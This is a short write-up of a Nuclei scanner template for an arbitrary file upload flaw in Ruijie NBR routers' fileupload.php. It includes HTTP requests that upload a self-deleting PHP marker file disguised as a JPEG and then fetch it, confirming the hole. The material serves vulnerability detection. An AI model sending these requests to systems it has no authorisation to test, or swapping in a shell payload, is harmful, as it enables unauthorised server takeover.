# Nuclei Template: Ruijie NBR fileupload.php - Arbitrary File Upload
**Template ID:** ruijie-nbr-fileupload
**Vulnerability Class:** Unrestricted Upload of File with Dangerous Type
**Severity:** Critical
**CWE:** CWE-434
**Source:** Nuclei Template (`ruijie-nbr-fileupload.yaml`)

## Vulnerability Information & PoC

## Description
Ruijie NBR router fileupload.php file has an arbitrary file upload vulnerability. An attacker can upload any file to the server through the vulnerability to obtain server permissions.

## Steps to reproduce / Exploit Payload
```http
POST /ddi/server/fileupload.php?uploadDir=upload&name={{filename}}.php HTTP/1.1
Host: {{Hostname}}
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
Content-Type: image/jpeg

<?php echo md5("{{string}}");unlink(__FILE__);?>

GET /ddi/server/upload/{{filename}}.php HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/ruijie-nbr-fileupload.yaml
